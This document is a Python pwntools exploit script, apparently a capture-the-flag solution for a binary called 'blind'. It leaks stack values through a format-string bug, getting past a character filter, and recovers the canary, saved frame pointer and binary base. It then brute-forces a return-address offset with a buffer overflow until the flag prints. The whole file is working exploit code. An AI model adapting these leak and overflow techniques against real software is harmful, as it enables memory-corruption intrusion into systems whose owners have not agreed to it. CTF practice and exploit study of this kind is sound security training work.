from pwn import *
import time

elf = context.binary = ELF('./blind')

def encryptPayload(payload):
    if b'$' in payload:
        return payload.replace(b'$', b'$\x01')
    return payload.replace(b'%', b'%\x01')

def leakData():
    payload = b'%p,' * 50
    payload = encryptPayload(payload)

    p.recvuntil(b'> \x1b[0m')
    p.sendline(payload)

    p.recvuntil(b'Stored data:')
    p.recvuntil(b'\x1b[0m')
    leak = p.recvuntil(b'\x1b[32m')
    leak = leak.split(b',')

    offset = 0x0
    for i in range(len(leak)):
        if leak[i] == b'0x70252c70252c7025' and offset == 0x0:
            offset = i+0x1
        if leak[i][0:3] == b'0x5' and leak[i-1][0:4] == b'0x7f' and b'nil' not in leak[i-2]:
            rip = int(leak[i], 16)
            log.success("leaked saved rip: " + hex(rip))
            base = rip & 0xfffffffffffff000
            log.success("leaked binary's base address: " + hex(base))
            rbp = int(leak[i-0x1], 16)
            log.success("leaked saved rbp: " + hex(rbp))
            canary = int(leak[i-0x2], 16)
            log.success("leaked canary's value: " + hex(canary))
            buf2can = i - 0x1 - offset
            buf2can = buf2can * 0x8
            log.success('buffer 2 canary length: ' + hex(buf2can))
            return rip, base, rbp, canary, buf2can
            break;

i = 0x0
while True:
    p = process()
    
    rip, base, rbp, canary, buf2can = leakData()
    
    target = base + i
    i += 0x1

    log.info('trying to jump to offset: ' + hex(i))
    payload = b'A' * buf2can + p64(canary) + p64(rbp) + p64(target)

    p.recvuntil(b'> \x1b[0m')
    p.sendline(payload)
    
    output = p.recvall(timeout=1.0)
    if b'FL1TZ' in output:
        log.success('found win offset: ' + hex(i))
        print(output)
        break
    
    p.close()
